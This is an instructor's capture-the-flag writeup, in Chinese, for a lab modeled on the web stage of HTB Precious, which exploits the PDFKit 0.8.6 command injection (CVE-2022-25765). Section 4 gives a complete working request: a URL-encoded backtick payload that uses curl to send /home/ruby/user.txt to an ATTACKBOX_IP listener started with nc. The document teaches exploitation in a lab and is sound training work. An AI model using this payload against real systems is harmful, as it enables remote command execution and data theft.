# Precious — Writeup

> 教师版解题说明。靶机只复现 HTB Precious 的 Web 阶段：PDFKit 命令注入并读取 Web 用户可访问的 Flag。后续 SSH、YAML 反序列化和 Linux Root 阶段不属于本题目标。

## 1. 侦察正常功能

访问首页，观察到服务接受一个 URL，并将远程网页转换为 PDF。

先准备一个自己控制的普通 HTML 页面：

```sh
mkdir -p /tmp/precious-page
printf '<html><body><h1>PDF conversion test</h1></body></html>' > /tmp/precious-page/index.html
cd /tmp/precious-page
python3 -m http.server 8000
```

将 `http://ATTACKBOX_IP:8000/` 提交给转换服务，下载返回的 PDF。这里应先确认普通转换功能确实可用，而不是一开始就猜测漏洞入口。

## 2. 检查 PDF 元数据

使用 ExifTool：

```sh
exiftool generated.pdf
```

关注 Creator 字段。该环境会显示类似：

```text
Creator : Generated by pdfkit v0.8.6
```

这提供了明确的组件和版本线索。不要仅凭页面外观推断后端技术。

## 3. 对照真实漏洞

PDFKit 0.8.6 对 URL source 的处理存在命令注入问题，对应 CVE-2022-25765。

关键不在于 wkhtmltopdf 本身提供了一个命令执行接口，而在于 PDFKit 构造命令时没有对用户控制的 URL source 做 shell escaping。当前靶机的 `site/app.rb` 将提交的 URL 直接传给 `PDFKit.new(input)`，使用的也是实际 PDFKit 0.8.6。

参考：
- <https://nvd.nist.gov/vuln/detail/CVE-2022-25765>
- <https://github.com/pdfkit/pdfkit/tree/v0.8.6>
- <https://0xdf.gitlab.io/2023/05/20/htb-precious.html>

## 4. 验证命令执行并读取 Web Flag

在 AttackBox 上准备一个接收 HTTP 请求的监听端口：

```sh
nc -lvnp 9000
```

然后将下面的请求发送到靶机。将两个 `ATTACKBOX_IP` 替换为 AttackBox 在靶场私网中的地址：

```sh
curl 'http://TARGET/' -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'url=http%3A%2F%2FATTACKBOX_IP%3A8000%2F%3Fname%3D%2520%60curl+-X+POST+--data-binary+%40%2Fhome%2Fruby%2Fuser.txt+http%3A%2F%2FATTACKBOX_IP%3A9000%2Fcollect%60'
```

请求中的 URL 在表单解码后仍保留 `%20` 和反引号。PDFKit 将其放入命令字符串时，shell 会解释反引号中的命令。这里使用 curl 将 `/home/ruby/user.txt` 的内容 POST 到 AttackBox 的监听端口。

如果利用成功，监听端会收到包含 Flag 的 HTTP 请求内容。执行身份是运行 Sinatra/PDFKit 的 `ruby` 用户，而不是 root。

## 5. Flag 与权限边界

本题目标文件为：

```text
/home/ruby/user.txt
```

该文件由 `ruby` 用户拥有，权限为只读（0400）。漏洞命令也以 `ruby` 身份执行，因此能够读取它，但不能据此声称获得 root。

本题只有一个 Web Flag。不要把原版 HTB Precious 后续的 SSH 凭据复用、YAML 反序列化和 sudo Root 链混入当前 Web 专项目标。

## 6. 关键知识点

- 从正常业务功能入手识别攻击面；
- 通过 PDF 元数据识别后端组件与版本；
- 阅读依赖库的命令构造逻辑；
- 区分参数传递、URL 编码与 shell 解释；
- 明确 Web 服务进程的执行身份和文件权限边界。
